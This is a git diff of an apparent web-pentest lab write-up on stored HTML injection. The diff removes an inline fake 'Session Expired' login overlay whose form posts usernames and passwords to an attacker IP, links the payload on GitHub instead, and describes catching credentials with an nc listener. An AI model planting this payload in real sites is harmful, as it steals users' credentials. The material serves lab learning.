@@ -19,21 +19,20 @@ categories:
 ![21](https://teckk2.github.io/assets/images/Web%20Pentest/A1/21.png)
 <br>It’s working, so using this we can trick the user to login to the web page and meanwhile we will capture the credential of that user.
 ![22](https://teckk2.github.io/assets/images/Web%20Pentest/A1/22.png)
+<br>[Payload](https://github.com/Teckk2/Teck_k2/blob/master/HTML%20Injection%20-Stored%20(Blog))
+<br>Now as soon you will submit, the web page will show session expired and login page
+![23](https://teckk2.github.io/assets/images/Web%20Pentest/A1/23.png)
+<br>Now refresh the nc and start listening again, and next time any user will login, we will be able to see the credentials.
+![24](https://teckk2.github.io/assets/images/Web%20Pentest/A1/24.png)
+![25](https://teckk2.github.io/assets/images/Web%20Pentest/A1/25.png)
 
-<font size="1">
-<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
+<p class="message">
+  ~ Hack the World and Stay Noob
+</p>
 
-<p><div style="position: absolute; left: 0px; top: 0px; width: 800px; height: 600px; 
-<br>background-color:white;">
-<br>Session Expired, Please Login:<br>
-<br><form name="login" action="http://192.168.140.136/hacktheuser.php/">
-<br><table>
-<br><tr><td>Username:</td><td><input type="text" name="user"/></td></tr>
-<br><tr><td>Password:</td><td><input type="password" name="pass"/></td></tr>
-<br></table>
-<br><input type="submit" value="Login"/>
-<br></form>
-<br></div></p>
-</div>
-</font>
+[Twitter](https://twitter.com/Teck__K2) / [Hack The Box](https://www.hackthebox.eu/profile/966) / [CTF Team](https://ctftime.org/team/20102) /
+[Teck_N00bs Community Telegram](https://t.me/Teck_N00bs)
+
+<script src="https://www.hackthebox.eu/badge/966"> </script>
+
 
